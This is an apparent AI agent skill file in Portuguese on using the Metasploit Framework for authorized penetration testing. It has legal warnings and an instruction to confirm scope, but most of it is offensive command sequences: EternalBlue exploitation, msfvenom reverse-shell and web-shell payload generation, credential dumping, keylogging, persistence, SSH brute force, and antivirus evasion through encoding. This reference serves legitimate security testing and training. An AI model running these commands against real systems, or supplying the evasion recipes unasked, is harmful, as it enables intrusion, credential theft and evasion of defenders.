---
name: metasploit-framework
description: "⚠️ USO SOMENTE AUTORIZADO > Esta habilidade destina-se apenas a fins educacionais ou avaliações de segurança autorizadas. > Você deve ter permissão explícita e por escrito do proprietário do sistema antes de usar esta ferramenta. > O uso indevido desta ferramenta é ilegal e estritamente proibido."
risk: ofensivo
source: comunidade
autor: zebbern
date_add: "2026-02-27"
---

# Metasploit Framework

> **⚠️ USO SOMENTE AUTORIZADO**
> Esta habilidade destina-se apenas a fins educacionais ou avaliações de segurança autorizadas.

> Você deve ter permissão explícita e por escrito do proprietário do sistema antes de usar esta ferramenta.

> O uso indevido desta ferramenta é ilegal e estritamente proibido.

## Objetivo

Utilize o Metasploit Framework para testes de penetração abrangentes, desde a exploração inicial até as atividades pós-exploração. O Metasploit fornece uma plataforma unificada para exploração de vulnerabilidades, geração de payloads, varredura auxiliar e manutenção do acesso a sistemas comprometidos durante avaliações de segurança autorizadas.

## Pré-requisitos

### Ferramentas Necessárias
```bash
# O Metasploit deve estar instalado antes de usar esta skill.

# O Kali Linux geralmente já vem com ele pré-instalado.

msfconsole --version
```

A instalação varia de acordo com o sistema operacional e a fonte do pacote. Siga o processo de instalação documentado pelo gerenciador de pacotes ou fornecedor da sua plataforma antes de usar esta skill. Não confie em um script de instalação remota não fixado dentro desta skill.

Se você deseja recursos baseados em banco de dados, como rastreamento de espaço de trabalho, inicialize o `msfdb` seguindo as instruções para sua instalação local. Esta skill pressupõe que o Metasploit já esteja disponível e não requer `sudo`, `systemctl` ou outras etapas de configuração com privilégios elevados no nível do host.

### Conhecimentos Necessários
- Fundamentos de redes e sistemas
- Compreensão de vulnerabilidades e exploits
- Conceitos básicos de programação
- Técnicas de enumeração de alvos

### Acesso Necessário
- Autorização por escrito para testes
- Acesso à rede dos sistemas alvo
- Compreensão do escopo e das regras de engajamento

Antes de executar os módulos de exploração, solicite ao usuário que confirme o host alvo exato, o escopo e o estado de autorização.

## Resultados e Entregáveis

1. **Evidências de Exploração** - Capturas de tela e registros de comprometimentos bem-sucedidos
2. **Registros de Sessão** - Histórico de comandos e dados extraídos
3. **Mapeamento de Vulnerabilidades** - Vulnerabilidades exploradas com referências CVE
4. **Artefatos Pós-Exploração** - Credenciais, arquivos e informações do sistema

## Fluxo de Trabalho Principal

### Fase 1: Noções Básicas do MSFConsole

Inicie e navegue no console do Metasploit:

```bash
# Iniciar o msfconsole
msfconsole

# Modo silencioso (ignorar banner)
msfconsole -q

# Comandos básicos de navegação
msf6 > help # Exibir todos os comandos
msf6 > search [termo] # Pesquisar módulos
msf6 > use [módulo] # Selecionar módulo
msf6 > info # Exibir detalhes do módulo
msf6 > show options # Exibir opções obrigatórias opções
msf6 > set [OPÇÃO] [valor] # Configurar opção
msf6 > run / exploit # Executar módulo
msf6 > back # Retornar ao console principal
msf6 > exit # Sair do msfconsole
```

### Fase 2: Tipos de Módulos

Entenda as diferentes categorias de módulos:

```bash
# 1. Módulos de Exploração - Exploram vulnerabilidades específicas
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Módulos de Carga Útil - Código executado após a exploração
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Módulos Auxiliares - Varredura, fuzzing, enumeração
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Módulos de Pós-Exploração - Ações após a invasão
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Codificadores - Ofuscar payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - Preenchimento de não operação para estouros de buffer
msf6 > show nops

# 7. Evasão - Ignorar controles de segurança
msf6 > show evasion
```

### Fase 3: Busca por Módulos

Encontre os módulos apropriados para os alvos:

```bash
# Busca por nome
msf6 > search eternalblue

# Busca por CVE
msf6 > search cve:2017-0144

# Busca por plataforma
msf6 > search plataforma:windows tipo:exploit

# Pesquisar por tipo e palavra-chave
msf6 > search type:auxiliary smb

# Filtrar por classificação (excelente, ótimo, bom, normal, médio, baixo, manual)
msf6 > search rank:excelente

# Pesquisa combinada
msf6 > search type:exploit platform:linux apache

# Exibir colunas dos resultados da pesquisa:
# Nome, Data de Divulgação, Classificação, Verificação (se pode verificar a vulnerabilidade), Descrição
```

### Fase 4: Configurando Exploits
Configure um exploit para execução:

```bash
# Selecione o módulo de exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Veja as opções necessárias
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Defina o host alvo
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Defina a porta alvo (se diferente da padrão)
msf6 exploit(...) > set RPORT 445

# Veja os payloads compatíveis
msf6 exploit(...) > show payloads

# Defina o payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Defina o host local para conexão reversa
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# Exibir todas as opções novamente para verificar
msf6 exploit(...) > show options

# Verificar se o alvo é vulnerável (se suportado)
msf6 exploit(...) > check

# Executar o exploit
msf6 exploit(...) > exploit
# ou
msf6 exploit(...) > run
```

### Fase 5: Tipos de Payload

Selecione o payload apropriado para a situação:

```bash
# Singles - Autocontido, sem staging
windows/shell_reverse_tcp
linux/x86/shell_bind_tcp

# Stagers - Payload pequeno que baixa um stage maior
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp

# Stages - Baixado pelo stager, fornece funcionalidade completa
# Meterpreter, VNC, shell

# Nome do payload Convenção:
# [plataforma]/[arquitetura]/[tipo_de_carga_útil]/[tipo_de_conexão]
# Exemplos:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/bind_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_https
android/meterpreter/reverse_tcp
```

### Fase 6: Sessão do Meterpreter

Trabalhe com o Meterpreter após a exploração:

```bash
# Após a exploração bem-sucedida, você verá o prompt do Meterpreter
meterpreter >

# Informações do Sistema
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Operações do Sistema de Arquivos
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Gerenciamento de Processos
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Rede
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Elevação de Privilégios
meterpreter > getsystem
meterpreter > getprivs

# Coleta de Credenciais
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Capturas de Tela e Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Acesso ao Shell
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Sessão em segundo plano
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

### Fase 7: Módulos auxiliares

Use módulos auxiliares para reconhecimento:

```bash
# Scanner de versão SMB
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Scanner de portas
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# Versão SSH Scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Login Anônimo FTP
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Scanner de Diretório HTTP
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Módulos de Força Bruta
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```
### Fase 8: Módulos de Pós-Exploração

Execute os módulos de pós-exploração nas sessões ativas:

```bash
# Listar sessões
msf6 > sessions -l

# Executar o módulo de pós-exploração em uma sessão específica
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(...) > run

# Ou execute diretamente do Meterpreter
meterpreter > run post/windows/gather/hashdump

# Módulos de Pós-Exploração Comuns
# Coleta de Credenciais
post/windows/gather/credentials/credential_collector
post/windows/gather/lsa_secrets
post/windows/gather/cachedump
post/multi/gather/ssh_creds

# Sistema Enumeração
post/windows/gather/enum_applications
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/linux/gather/enum_configs

# Elevação de privilégios
post/windows/escalate/getsystem
post/multi/recon/local_exploit_suggester

# Persistência
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Pivotagem
post/multi/manage/autoroute
```

### Fase 9: Geração de payloads com msfvenom

Criar payloads independentes:

```bash
# Shell reverso básico do Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Shell reverso para Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Shell reverso para PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Shell reverso para Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# Payload para PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# Shell web ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# Arquivo WAR (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# APK para Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

# Payload codificado (para burlar antivírus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Listar formatos disponíveis
msfvenom --list formats

# Listar codificadores disponíveis
msfvenom --list encoders
```

### Fase 10: Configurando os manipuladores

Configurar o ouvinte para conexões de entrada:

```bash
# Configuração manual do manipulador
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# A flag -j executa como tarefa em segundo plano
msf6 > jobs -l

# Quando o payload é executado no alvo, a sessão é aberta
[*] Sessão Meterpreter 1 aberta

# Interagir com a sessão
msf6 > sessions -i 1
```

## Referência Rápida

### Comandos Essenciais do MSFConsole

| Comando | Descrição |

|---------|-------------|

| `search [termo]` | Busca módulos |

| `use [módulo]` | Seleciona um módulo |

| `info` | Exibe informações do módulo |

| `show options` | Exibe opções configuráveis ​​|

| `set [OPT] [val]` | Define o valor da opção |

| `setg [OPT] [val]` | Define uma opção global |

| `run` / `exploit` | Executa o módulo |

| `check` | Verifica a vulnerabilidade do alvo |

| `back` | Desmarca o módulo |

| `sessions -l` | Listar sessões ativas |

| `sessions -i [N]` | Interagir com a sessão |

| `jobs -l` | Listar tarefas em segundo plano |

| `db_nmap` | Executar nmap com banco de dados |

### Comandos Essenciais do Meterpreter

| Comando | Descrição |

|---------|-------------|

| `sysinfo` | Informações do sistema |

| `getuid` | Usuário atual |

| `getsystem` | Tentar escalonamento de privilégios |

| `hashdump` | Despejar hashes de senhas |

| `shell` | Acessar o shell do sistema |

| `upload/download` | Transferência de arquivos |

| `screenshot` | Capturar tela |

| `keyscan_start` | Iniciar keylogger |

| `migrate [PID]` | Alternar para outro processo |

| `background` | Sessão em segundo plano |

| `portfwd` | Encaminhamento de portas |

### Módulos de Exploração Comuns

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms08_067_netapi
exploit/windows/http/iis_webdav_upload_asp
exploit/windows/local/bypassuac

# Linux
exploit/linux/ssh/sshexec
exploit/linux/local/overlayfs_priv_esc
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Aplicações Web
exploit/multi/http/tomcat_mgr_upload
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/jenkins_script_console
```

## Restrições e Limitações

### Requisitos Legais
- Use somente em sistemas que você Possuir autorização por escrito para realizar os testes
- Documentar todas as atividades de teste
- Seguir as regras de engajamento
- Reportar todas as descobertas às partes apropriadas

### Limitações Técnicas
- Antivírus/EDR modernos podem detectar payloads do Metasploit
- Alguns exploits exigem configurações específicas do alvo
- Regras de firewall podem bloquear conexões reversas
- Nem todos os exploits funcionam em todas as versões do alvo

### Segurança Operacional
- Usar canais criptografados (reverse_https) sempre que possível
- Limpar os artefatos após os testes
- Evitar a detecção por sistemas de monitoramento
- Limitar a pós-exploração ao escopo acordado

## Solução de Problemas

| Problema | Soluções |

|-------|-----------|

| Banco de dados não conectado | Execute `sudo msfdb init`, inicie o PostgreSQL e, em seguida, `db_connect` |

| Exploit falha/sem sessão | Execute `check`; verifique a arquitetura do payload; verifique o firewall; tente payloads diferentes |

| Sessão encerra imediatamente | Migre para um processo estável; use um payload sem etapas; verifique o antivírus; use o AutoRunScript | | Carga útil detectada pelo antivírus | Usar codificação `-e x86/shikata_ga_nai -i 10`; usar módulos de evasão; modelos personalizados |

## Quando usar
Esta habilidade é aplicável para executar o fluxo de trabalho ou as ações descritas na visão geral.